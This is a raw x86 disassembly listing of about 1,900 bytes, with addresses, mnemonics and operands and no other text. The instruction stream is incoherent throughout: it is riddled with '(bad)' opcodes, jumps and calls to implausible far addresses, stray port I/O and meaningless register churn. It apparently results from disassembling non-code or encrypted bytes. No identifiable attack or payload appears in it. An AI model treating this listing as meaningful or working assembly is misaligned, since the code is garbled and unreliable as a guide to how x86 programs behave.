  42700e:	mov    eax,DWORD PTR [eax]
  427010:	cld    
  427011:	mov    eax,eax
  427013:	call   0x462a806d
  427018:	sub    DWORD PTR [ebx-0x3c743000],ecx
  42701e:	cld    
  42701f:	mov    BYTE PTR [eax+0x8401c1],0x1
  427026:	xor    BYTE PTR [eax],al
  427028:	push   edi
  427029:	inc    ebp
  42702a:	mov    DWORD PTR [ebx],esi
  42702c:	in     al,0xb9
  42702e:	inc    ebp
  42702f:	lea    ecx,[ebx-0x3c370301]
  427035:	dec    ebp
  427036:	cwde   
  427037:	mov    esi,DWORD PTR [edx]
  427039:	or     BYTE PTR [ebx],al
  42703b:	ror    DWORD PTR [ebp-0xfebf79],0x0
  427042:	call   0x42998c
  427047:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  42704d:	jge    0x427082
  42704f:	mov    eax,DWORD PTR [ebx]
  427051:	cld    
  427052:	lea    edx,[eax+0xff0120]
  427058:	call   0x4299ec
  42705d:	push   eax
  42705e:	inc    DWORD PTR [ebp-0x1c]
  427061:	mov    ecx,DWORD PTR [ebp-0x58]
  427064:	xor    eax,DWORD PTR [eax]
  427066:	add    edi,edi
  427068:	cmp    ebp,eax
  42706a:	jne    0x427092
  42706c:	mov    DWORD PTR [eax],0x8b004dd8
  427072:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  427079:	mov    eax,ebx
  42707b:	cld    
  42707c:	test   BYTE PTR [eax+0x320198],bh
  427082:	mov    DWORD PTR [ebp+0x8],esi
  427085:	xor    eax,DWORD PTR [ebp-0x73]
  427088:	test   DWORD PTR [esp+esi*2-0x1],edi
  42708c:	mov    ebp,eax
  42708e:	mov    eax,0x33004d29
  427093:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427099:	add    DWORD PTR [eax],eax
  42709b:	add    BYTE PTR [ebp+0x30],al
  42709e:	mov    edx,DWORD PTR [edi-0x48]
  4270a1:	add    ebx,0xffffffe4
  4270a4:	push   0x2b74cd85
  4270a9:	mov    eax,DWORD PTR [ebx]
  4270ab:	cld    
  4270ac:	sar    BYTE PTR [eax+0x3b0145],1
  4270b2:	pcmpeqw mm4,mm6
  4270b5:	xor    edi,edi
  4270b7:	lea    ecx,[ebx-0x239c7470]
  4270bd:	add    BYTE PTR [ebp+0x50],cl
  4270c0:	cmp    eax,DWORD PTR [ebp+0x75]
  4270c3:	mov    ebp,DWORD PTR [eax-0x68]
  4270c6:	test   DWORD PTR [eax],eax
  4270c8:	clc    
  4270c9:	push   DWORD PTR [ebp-0x1]
  4270cc:	lea    ecx,[eax]
  4270ce:	int3   
  4270cf:	inc    ebp
  4270d0:	call   0xfaa160
  4270d5:	jne    0x4270cf
  4270d7:	xor    edi,DWORD PTR [ebp-0x41]
  4270da:	jmp    0x42714e
  4270dc:	mov    eax,DWORD PTR [eax]
  4270de:	mov    eax,0x339545c7
  4270e3:	inc    DWORD PTR [ebx]
  4270e5:	push   DWORD PTR [ecx]
  4270e7:	aaa    
  4270e8:	mov    eax,DWORD PTR [eax]
  4270ea:	jmp    0x42713c
  4270ec:	mov    eax,DWORD PTR [ebp-0x3c]
  4270ef:	mov    eax,eax
  4270f1:	cld    
  4270f2:	clc    
  4270f3:	ret    
  4270f4:	test   bh,al
  4270f6:	pop    es
  4270f7:	xchg   ebp,eax
  4270f8:	add    bh,bh
  4270fa:	inc    ebp
  4270fb:	dec    DWORD PTR [edi]
  4270fd:	and    DWORD PTR [ebx],ebp
  4270ff:	add    BYTE PTR [eax],al
  427101:	push   eax
  427102:	jbe    0x427159
  427104:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  42710a:	or     al,0xcf
  42710c:	inc    eax
  42710d:	enter  0x745,0x72
  427111:	inc    ebp
  427112:	mov    eax,DWORD PTR [ecx]
  427114:	int3   
  427115:	add    BYTE PTR [ebp-0x75],al
  427118:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  42711e:	ror    BYTE PTR [ebp+0x72f80885],1
  427124:	inc    ebp
  427125:	add    BYTE PTR [ebx-0x3c7423bb],cl
  42712b:	fadd   st,st(6)
  42712d:	rol    BYTE PTR [ebp+0x12],0x8b
  427131:	inc    ebp
  427132:	fmul   QWORD PTR [ebx-0x3c39233d]
  427138:	inc    ebp
  427139:	test   bh,al
  42713b:	cwde   
  42713c:	clc    
  42713d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  427143:	inc    ebp
  427144:	cmp    dh,BYTE PTR [ebx]
  427146:	pushf  
  427147:	mov    ecx,0xffb48dc7
  42714c:	test   eax,ecx
  42714e:	clc    
  42714f:	dec    ebp
  427150:	inc    ebp
  427151:	mov    edi,DWORD PTR [eax+ecx*1]
  427154:	pushf  
  427155:	rol    edi,0x86
  427158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427159:	inc    BYTE PTR [ebp+0x45f7f8ff]
  42715f:	inc    ebp
  427160:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  427168:	test   DWORD PTR [eax],edi
  42716a:	clc    
  42716b:	pushf  
  42716c:	inc    ebp
  42716d:	dec    DWORD PTR [ebx-0x3cba0f04]
  427173:	push   eax
  427174:	(bad)  
  427175:	cld    
  427176:	jge    0x427178
  427178:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  42717e:	add    BYTE PTR [ebx],dl
  427180:	jmp    0xcd72d2
  427185:	les    eax,FWORD PTR [ebp-0x35]
  427188:	mov    ecx,esi
  42718a:	lock or al,cl
  42718d:	clc    
  42718e:	inc    ebp
  42718f:	add    esi,DWORD PTR [ebx]
  427191:	jge    0x427196
  427193:	xor    edi,DWORD PTR [ebx]
  427195:	cmp    ecx,DWORD PTR [edi]
  427197:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42719c:	mov    edi,DWORD PTR [ecx]
  42719e:	test   al,0xcc
  4271a0:	dec    ebp
  4271a1:	test   BYTE PTR [ebx],dh
  4271a3:	pop    es
  4271a4:	xor    eax,DWORD PTR [eax]
  4271a6:	add    ecx,DWORD PTR [esi]
  4271a8:	add    ecx,eax
  4271aa:	psraw  mm0,mm1
  4271ad:	sub    BYTE PTR [ebp+0x38],cl
  4271b0:	mov    edi,DWORD PTR [ebx]
  4271b2:	lock int3 
  4271b4:	shl    edx,1
  4271b6:	rol    BYTE PTR [ebp+0xc],1
  4271b9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4271c0:	jmp    0x7b720a
  4271c5:	pushf  
  4271c6:	inc    ebp
  4271c7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4271cd:	xor    ecx,ebx
  4271cf:	add    ecx,esi
  4271d1:	mov    esi,eax
  4271d3:	enter  0x45af,0x8b
  4271d7:	xor    ecx,eax
  4271d9:	add    edx,DWORD PTR [ebp-0x77]
  4271dc:	sub    ecx,DWORD PTR [eax]
  4271de:	cmp    eax,DWORD PTR [ebp+0x77]
  4271e1:	fmul   DWORD PTR [ebx-0x76385764]
  4271e7:	test   al,0x0
  4271e9:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  4271ef:	cmp    esi,DWORD PTR [ebx]
  4271f1:	pushf  
  4271f2:	xor    eax,edi
  4271f4:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  4271fb:	inc    ebp
  4271fc:	dec    ebp
  4271fd:	cmp    eax,0xc7f09c8b
  427202:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  427209:	inc    ebp
  42720a:	jmp    0x42724b
  42720c:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  427213:	dec    ebp
  427214:	xor    esi,DWORD PTR [ebx]
  427216:	add    eax,DWORD PTR [ebx]
  427218:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  42721e:	dec    ebp
  42721f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  427225:	out    dx,eax
  427226:	rol    BYTE PTR [eax],1
  427228:	add    eax,0xebc8458b
  42722d:	dec    ebp
  42722e:	mov    ebp,DWORD PTR [ebx]
  427230:	mov    esp,0x33f84d8b
  427235:	ret    
  427236:	xor    eax,esi
  427238:	add    ecx,eax
  42723a:	add    eax,DWORD PTR [edx+0xc1010f]
  427240:	dec    ebp
  427241:	inc    ebp
  427242:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  427248:	ror    bl,1
  42724a:	add    eax,0xebc645ce
  42724f:	scas   eax,DWORD PTR es:[edi]
  427250:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  427256:	xor    ebp,DWORD PTR [ebx]
  427258:	xor    edi,DWORD PTR [ebx]
  42725a:	add    esi,DWORD PTR [edi+0x3]
  42725d:	mov    ecx,DWORD PTR [edi]
  42725f:	clc    
  427260:	rol    ebx,0x4d
  427263:	(bad)  
  427264:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  42726b:	mov    ah,0x45
  42726d:	dec    ebp
  42726e:	jbe    0x4272a3
  427270:	mov    esi,DWORD PTR [ebx]
  427272:	call   0x3345bf7a
  427277:	rdpmc  
  427279:	rol    DWORD PTR [ebx],0x4d
  42727c:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427282:	inc    ebp
  427283:	ror    BYTE PTR [ebx+0x45450808],1
  427289:	jmp    0x10a7319
  42728e:	inc    ebp
  42728f:	inc    ebp
  427290:	(bad)  
  427291:	mov    ebx,eax
  427293:	clc    
  427294:	test   ebx,eax
  427296:	clc    
  427297:	retf   
  427298:	inc    ebp
  427299:	into   
  42729a:	mov    esi,0x8b85afec
  4272a0:	clc    
  4272a1:	enter  0x5545,0x3a
  4272a5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4272ac:	ret    
  4272ad:	mov    ah,0xc6
  4272af:	addr16 push 0x338b4545
  4272b5:	clc    
  4272b6:	add    eax,ebx
  4272b8:	loopne 0x427285
  4272ba:	dec    ebp
  4272bb:	into   
  4272bc:	mov    al,dh
  4272be:	or     BYTE PTR [edi-0x37ff748e],ch
  4272c4:	inc    ebp
  4272c5:	push   ebp
  4272c6:	mov    ebp,DWORD PTR [ebx]
  4272c8:	in     al,dx
  4272c9:	cmp    eax,ebx
  4272cb:	ja     0x427312
  4272cd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  4272d3:	inc    ebp
  4272d4:	cwde   
  4272d5:	mov    esi,DWORD PTR [edx]
  4272d7:	clc    
  4272d8:	mov    bl,al
  4272da:	xlat   BYTE PTR ds:[ebx]
  4272db:	retf   
  4272dc:	inc    ebp
  4272dd:	into   
  4272de:	mov    eax,esi
  4272e0:	in     al,dx
  4272e1:	scas   eax,DWORD PTR es:[edi]
  4272e2:	retf   
  4272e3:	mov    ecx,DWORD PTR [ebp-0x38]
  4272e6:	mov    edx,DWORD PTR [ebp-0x24]
  4272e9:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  4272f0:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  4272f7:	mov    eax,DWORD PTR [ebx]
  4272f9:	clc    
  4272fa:	loopne 0x4272bf
  4272fc:	push   ebp
  4272fd:	retf   
  4272fe:	mov    dh,al
  427300:	adc    esi,ecx
  427302:	jb     0x4272b3
  427304:	add    BYTE PTR [ebx+0x558bc845],cl
  42730a:	in     al,dx
  42730b:	sub    eax,ebx
  42730d:	cmp    ecx,ebx
  42730f:	mov    eax,esi
  427311:	mov    esp,0x45af03ce
  427316:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  42731c:	mov    eax,ebx
  42731e:	in     al,dx
  42731f:	into   
  427320:	dec    ebp
  427321:	(bad)  
  427322:	xor    ebp,DWORD PTR [edi+0x80f8903]
  427328:	rol    DWORD PTR [ebp+0x4d],0x89
  42732c:	xor    esp,esp
  42732e:	sub    eax,DWORD PTR [ebp-0x75]
  427331:	add    ebp,esp
  427333:	mov    al,0x55
  427335:	inc    ebp
  427336:	xor    edi,DWORD PTR [eax]
  427338:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  42733f:	inc    ebp
  427340:	xor    edi,DWORD PTR [ecx]
  427342:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  427349:	test   DWORD PTR [eax],eax
  42734b:	clc    
  42734c:	enter  0x8645,0x33
  427350:	inc    DWORD PTR [ebx]
  427352:	(bad)  
  427353:	jmp    0x42739a
  427355:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  42735b:	inc    ebp
  42735c:	(bad)  
  42735d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  427363:	cwde   
  427364:	retf   
  427365:	xor    al,cl
  427367:	mov    BYTE PTR [ebp+0xb],cl
  42736a:	lea    eax,[ebp+0x8]
  42736d:	xor    esi,DWORD PTR [edx+0x3]
  427370:	add    al,ah
  427372:	inc    ebp
  427373:	dec    ebp
  427374:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  42737a:	push   0x2b45cd00
  42737f:	mov    al,BYTE PTR [ebx]
  427381:	or     esi,eax
  427383:	dec    ebp
  427384:	inc    ebp
  427385:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42738b:	push   ebp
  42738c:	(bad)  
  42738d:	mov    BYTE PTR [edi+0xf723b11],ch
  427393:	add    ch,ch
  427395:	inc    ebp
  427396:	dec    DWORD PTR [ebx-0x34332775]
  42739c:	add    al,0x4d
  42739e:	inc    ebp
  42739f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4273a5:	cwde   
  4273a6:	add    DWORD PTR [edx],esi
  4273a8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4273ae:	push   DWORD PTR [ebx]
  4273b0:	int3   
  4273b1:	xor    eax,DWORD PTR [eax]
  4273b3:	add    edx,DWORD PTR [eax+0x3]
  4273b6:	mov    DWORD PTR [edi],ecx
  4273b8:	call   0x4288347e
  4273bd:	mov    DWORD PTR [ebp-0x20],esp
  4273c0:	add    BYTE PTR [ebp+0x7d],al
  4273c3:	mov    eax,DWORD PTR [eax]
  4273c5:	in     al,0x15
  4273c7:	ret    
  4273c8:	iret   
  4273c9:	(bad)  
  4273ca:	enter  0x14af,0x8b
  4273ce:	(bad)  
  4273cf:	in     al,dx
  4273d0:	or     bl,cl
  4273d2:	adc    cl,al
  4273d4:	push   ebp
  4273d5:	dec    ebp
  4273d6:	inc    eax
  4273d7:	mov    edx,DWORD PTR [ebp-0x20]
  4273da:	jb     0x4273a7
  4273dc:	mov    ecx,esi
  4273de:	cld    
  4273df:	scas   eax,DWORD PTR es:[edi]
  4273e0:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  4273e7:	mov    BYTE PTR [eax],0x8c
  4273ea:	push   0xffffff98
  4273ec:	push   edi
  4273ed:	xor    dl,BYTE PTR [eax+0x3b]
  4273f0:	mov    ecx,DWORD PTR [edi]
  4273f2:	call   0x8c41b955
  4273f7:	mov    eax,eax
  4273f9:	in     al,dx
  4273fa:	jge    0x427449
  4273fc:	mov    DWORD PTR [ebx],esi
  4273fe:	int3   
  4273ff:	add    eax,DWORD PTR [ebp+0xf]
  427402:	xor    eax,ecx
  427404:	(bad)  
  427405:	dec    ebp
  427406:	pushf  
  427407:	xor    ecx,eax
  427409:	add    edi,DWORD PTR [edi]
  42740b:	mov    eax,DWORD PTR [ebp-0x38]
  42740e:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  427415:	mov    DWORD PTR [edx+0xf4505c8],ecx
  42741b:	xor    edx,DWORD PTR [ecx+edi*4]
  42741e:	or     BYTE PTR [ebp-0x371600bd],0xf
  427425:	dec    ebp
  427426:	leave  
  427427:	mov    edx,ecx
  427429:	rol    BYTE PTR [ebp+0x330155],1
  42742f:	add    ecx,DWORD PTR [ebp+0xf]
  427432:	xor    eax,edx
  427434:	(bad)  
  427435:	ror    DWORD PTR [eax],0x86
  427438:	jb     0x427437
  42743a:	add    bh,bh
  42743c:	clc    
  42743d:	inc    ebp
  42743e:	jb     0x4274aa
  427440:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  427446:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  42744c:	shr    BYTE PTR [eax-0x3d],0x30
  427450:	clc    
  427451:	add    BYTE PTR [ebp+0x75],al
  427454:	cmp    BYTE PTR [edx-0x64],ch
  427457:	inc    edi
  427459:	adc    al,0xe8
  42745b:	inc    ebp
  42745c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  427462:	mov    ecx,DWORD PTR [eax]
  427464:	cld    
  427465:	or     DWORD PTR [ebp-0x34],0x33
  427469:	jbe    0x42746e
  42746b:	mov    edx,DWORD PTR [ecx+0x2b]
  42746e:	dec    ebp
  42746f:	mov    cl,BYTE PTR [ebx+0x45d801]
  427475:	mov    BYTE PTR [ebx],dh
  427477:	mov    eax,DWORD PTR [ebx]
  427479:	or     BYTE PTR [ecx+0x3b],dl
  42747c:	dec    ebp
  42747d:	int3   
  42747e:	xor    ebp,edi
  427480:	add    eax,DWORD PTR [ebp+0x51]
  427483:	mov    ecx,DWORD PTR [ebp-0x28]
  427486:	xor    eax,DWORD PTR [eax]
  427488:	add    ebp,DWORD PTR [eax+0x51]
  42748b:	adc    BYTE PTR [eax+0x0],0x8b
  42748f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427495:	inc    ebp
  427496:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42749c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4274a2:	dec    ebp
  4274a3:	mov    esi,DWORD PTR [ebx]
  4274a5:	hlt    
  4274a6:	add    eax,ebx
  4274a8:	push   ecx
  4274a9:	inc    ebp
  4274aa:	dec    ebp
  4274ab:	sar    bh,1
  4274ad:	shl    ah,1
  4274af:	(bad)  
  4274b0:	retf   
  4274b1:	mov    al,ds:0xc5ff3dce
  4274b6:	adc    al,0xc6
  4274b8:	inc    ebp
  4274b9:	and    eax,0x9c0f4c85
  4274be:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4274c5:	cmp    BYTE PTR [ebx+0x3b],0x0
  4274c9:	mov    dh,0xc7
  4274cb:	cmp    eax,eax
  4274cd:	jne    0x45436d19
  4274d3:	mov    edi,DWORD PTR [edx]
  4274d5:	mov    eax,0x848bcb9c
  4274da:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  4274e1:	or     BYTE PTR [edi],cl
  4274e3:	(bad)  
  4274e4:	dec    ebp
  4274e5:	inc    edi
  4274e6:	add    bh,0x50
  4274e9:	or     cl,ch
  4274eb:	test   DWORD PTR [eax+0x4d4501f8],ecx
  4274f1:	xchg   DWORD PTR [eax-0x1638af64],eax
  4274f7:	mov    esp,0xf802b588
  4274fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274fd:	inc    ebp
  4274fe:	(bad)  
  4274ff:	cmp    al,0xff
  427501:	pushf  
  427502:	or     DWORD PTR [ecx+0x45ffe474],0x0
  427509:	mov    ecx,DWORD PTR [ebp-0x340018]
  42750f:	into   
  427510:	dec    DWORD PTR [ebx-0x7f72431c]
  427516:	push   0x5000ff01
  42751b:	retf   
  42751c:	inc    ebp
  42751d:	into   
  42751e:	dec    DWORD PTR [ebx-0x343f3ff4]
  427524:	push   eax
  427525:	into   
  427526:	call   0x4a79b6
  42752b:	retf   
  42752c:	add    dh,cl
  42752e:	add    bh,bh
  427530:	mov    DWORD PTR [eax+ecx*1],edx
  427533:	clc    
  427534:	inc    ebp
  427535:	inc    ebp
  427536:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  42753c:	push   0x1
  42753e:	push   edi
  42753f:	add    BYTE PTR [eax-0x35],dl
  427542:	mov    ecx,esi
  427544:	cld    
  427545:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  42754b:	into   
  42754c:	ror    BYTE PTR [ebx+0x75000800],0x50
  427553:	xor    eax,DWORD PTR [ebp+0x3]
  427556:	jne    0x4275a9
  427558:	call   DWORD PTR [eax-0x3c]
  42755b:	mov    DWORD PTR [ecx-0x18],edx
  42755e:	mov    edi,edi
  427560:	call   0x8b45bae9
  427565:	add    ah,ah
  427567:	rol    BYTE PTR [ebp-0x7c],0xeb
  42756b:	add    edi,edi
  42756d:	add    al,ch
  42756f:	inc    ebp
  427570:	push   ecx
  427571:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  427577:	mov    al,0xc7
  427579:	test   esp,esp
  42757b:	clc    
  42757c:	test   DWORD PTR [ebp-0x8],ecx
  42757f:	add    BYTE PTR [ebp+0x50],0x39
  427583:	jmp    0x8bcbfe24
  427588:	in     al,dx
  427589:	or     BYTE PTR [ebp-0xf],al
  42758c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427592:	hlt    
  427593:	mov    eax,DWORD PTR [ebp-0x50]
  427596:	xor    esi,ecx
  427598:	add    eax,DWORD PTR [eax+0x4f086889]
  42759e:	inc    ebp
  42759f:	sbb    eax,0x68
  4275a2:	pushf  
  4275a3:	inc    edi
  4275a5:	add    al,ch
  4275a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275a8:	test   edi,edi
  4275aa:	clc    
  4275ab:	inc    DWORD PTR [ebp-0x73]
  4275ae:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  4275b2:	(bad)  
  4275b3:	push   ecx
  4275b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275b5:	jne    0x42753c
  4275b7:	push   eax
  4275b8:	clc    
  4275b9:	test   DWORD PTR [ebp-0x1],eax
  4275bc:	cmp    eax,0xc78b9cff
  4275c1:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  4275c8:	inc    ebp
  4275c9:	push   edi
  4275ca:	aas    
  4275cb:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  4275d2:	dec    ebp
  4275d3:	add    BYTE PTR [ebx],dh
  4275d5:	inc    ebp
  4275d6:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  4275dc:	enter  0x8401,0x0
  4275e0:	add    al,BYTE PTR [eax]
  4275e2:	add    bh,bh
  4275e4:	out    dx,eax
  4275e5:	sbb    BYTE PTR [eax],al
  4275e7:	dec    ebp
  4275e8:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  4275ee:	sub    esi,DWORD PTR [ebx]
  4275f0:	mov    ebp,DWORD PTR [eax-0x8]
  4275f3:	add    bl,0x0
  4275f6:	(bad)  
  4275f7:	cmp    eax,ecx
  4275f9:	or     BYTE PTR [edx+0x750114],al
  4275ff:	inc    DWORD PTR [ebp+0x18]
  427602:	mov    eax,DWORD PTR [ebp-0x8]
  427605:	mov    ebx,eax
  427607:	(bad)  
  427608:	retf   
  427609:	inc    ebp
  42760a:	into   
  42760b:	mov    esi,eax
  42760d:	int3   
  42760e:	scas   eax,DWORD PTR es:[edi]
  42760f:	push   es
  427610:	mov    esi,DWORD PTR [ebp-0xc]
  427613:	call   DWORD PTR [ebp+0x18]
  427616:	sub    edi,DWORD PTR [ebp+0x3b]
  427619:	mov    esi,DWORD PTR [edi-0x34]
  42761c:	mov    eax,DWORD PTR [ebp-0x8]
  42761f:	cmp    bl,al
  427621:	pushf  
  427622:	mov    bh,0xbc
  427625:	fadd   QWORD PTR [eax]
  427627:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  42762d:	mov    esi,DWORD PTR [ebx]
  42762f:	in     al,0x33
  427631:	ret    
  427632:	add    eax,esi
  427634:	add    eax,DWORD PTR [ebp+0xf]
  427637:	mov    eax,ecx
  427639:	in     al,0x4d
  42763b:	ret    
  42763c:	mov    eax,esi
  42763e:	in     al,dx
  42763f:	inc    ebp
  427640:	rol    edi,1
  427642:	sar    al,1
  427644:	or     BYTE PTR [ebp+0x45e9f845],al
  42764a:	add    BYTE PTR [edx],bh
  42764c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427653:	test   ebx,eax
  427655:	clc    
  427656:	retf   
  427657:	inc    ebp
  427658:	into   
  427659:	cmp    al,0xc6
  42765b:	pushf  
  42765c:	scas   eax,DWORD PTR es:[edi]
  42765d:	(bad)  
  42765e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427665:	inc    ebp
  427666:	cmp    edi,DWORD PTR [esi]
  427668:	ja     0x427606
  42766a:	mov    eax,edi
  42766c:	mov    esp,0x458567a8
  427671:	clc    
  427672:	mov    eax,DWORD PTR [ebp-0x8]
  427675:	mov    eax,ebx
  427677:	in     al,dx
  427678:	retf   
  427679:	ret    
  42767a:	into   
  42767b:	mov    dh,0x7d
  42767e:	scas   eax,DWORD PTR es:[edi]
  42767f:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427685:	add    BYTE PTR [ebx],ch
  427687:	jmp    0xb977c7
  42768c:	mov    eax,DWORD PTR [ebp-0x5c]
  42768f:	mov    eax,DWORD PTR [ebp-0x14]
  427692:	inc    ebp
  427693:	enter  0x458b,0xf8
  427697:	xor    eax,ebx
  427699:	add    ecx,ebx
  42769b:	cmp    ecx,esi
  42769d:	shufps xmm7,xmm4,0xaf
  4276a1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  4276a7:	dec    ebp
  4276a8:	sub    esi,DWORD PTR [ebx]
  4276aa:	cmp    esi,DWORD PTR [ebx]
  4276ac:	ja     0x4276b1
  4276ae:	mov    eax,DWORD PTR [ebx]
  4276b0:	lods   al,BYTE PTR ds:[esi]
  4276b1:	mov    db0,ecx
  4276b4:	inc    ebp
  4276b5:	dec    ebp
  4276b6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4276bc:	retf   
  4276bd:	rol    dh,1
  4276bf:	or     al,0xce
  4276c1:	inc    ebp
  4276c2:	scas   eax,DWORD PTR es:[edi]
  4276c3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4276c9:	add    BYTE PTR [ebx],ch
  4276cb:	add    BYTE PTR [ebx],bh
  4276cd:	inc    ebp
  4276ce:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  4276d4:	inc    ebp
  4276d5:	retf   
  4276d6:	mov    ecx,esi
  4276d8:	clc    
  4276d9:	(bad)  
  4276da:	retf   
  4276db:	scas   eax,DWORD PTR es:[edi]
  4276dc:	ret    
  4276dd:	mov    ecx,esi
  4276df:	hlt    
  4276e0:	(bad)  
  4276e1:	push   ebp
  4276e2:	scas   eax,DWORD PTR es:[edi]
  4276e3:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  4276e9:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  4276ef:	add    BYTE PTR [ebx],al
  4276f1:	mov    eax,eax
  4276f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276f4:	inc    ebp
  4276f5:	dec    ebp
  4276f6:	cmp    BYTE PTR [ebx],dh
  4276f8:	pushf  
  4276f9:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  4276ff:	(bad)  
  427701:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427709:	sar    eax,1
  42770b:	rol    BYTE PTR [ebp+0x5],1
  42770e:	xor    eax,DWORD PTR [ebp+0x3]
  427711:	jmp    0x4276fe
  427713:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427719:	xor    eax,DWORD PTR [ebp+0x33]
  42771c:	mov    eax,DWORD PTR [ebx]
  42771e:	rol    BYTE PTR [ebx],1
  427720:	test   BYTE PTR [edi],cl
  427722:	cwde   
  427723:	shl    DWORD PTR [edx],0x4d
  427726:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  42772c:	xor    edx,eax
  42772e:	add    eax,DWORD PTR ds:0xeb4d45e0
  427734:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  42773a:	add    BYTE PTR [ebx],dh
  42773c:	inc    ebp
  42773d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427743:	rdpmc  
  427745:	rol    DWORD PTR [ebx],0x4d
  427748:	loopne 0x4276d5
  42774a:	push   ebp
  42774b:	in     al,dx
  42774c:	mov    cl,dl
  42774e:	adc    eax,edx
  427750:	jb     0x427757
  427752:	add    BYTE PTR [ebp+0x45],al
  427755:	jmp    0x4276e2
  427757:	mov    ebx,eax
  427759:	test   al,0xcb
  42775b:	dec    ebp
  42775c:	dec    ebp
  42775d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427763:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427769:	dec    ebp
  42776a:	mov    al,0x8b
  42776c:	dec    ebp
  42776d:	in     al,dx
  42776e:	xor    edx,ecx
  427770:	xor    edx,eax
  427772:	add    eax,DWORD PTR [ebp+0x3]
  427775:	jbe    0x427786
  427777:	mov    eax,ecx
  427779:	test   al,0x45
  42777b:	dec    ebp
  42777c:	mov    DWORD PTR [ebx],esi
  42777e:	loopne 0x4277b3
  427780:	inc    ebp
  427781:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427787:	rol    esi,0x45
  42778a:	scas   eax,DWORD PTR es:[edi]
  42778b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427791:	mov    eax,ecx
  427793:	hlt    
  427794:	dec    ebp
  427795:	inc    ebp
  427796:	mov    eax,edi
  427798:	loopne 0x427772
  42779a:	retf   
  42779b:	test   esi,ecx
  42779d:	clc    
  42779e:	scas   eax,DWORD PTR es:[edi]
  42779f:	inc    ebp
  4277a0:	mov    eax,edi
  4277a2:	fdiv   st,st(0)
  4277a4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  4277aa:	cwde   
  4277ab:	cmp    dh,BYTE PTR [edx]
  4277ad:	pushf  
  4277ae:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  4277b4:	inc    esi
  4277b6:	mov    ebp,DWORD PTR [eax-0x10]
  4277b9:	inc    ebp
  4277ba:	dec    ebp
  4277bb:	xor    esi,DWORD PTR [ebx]
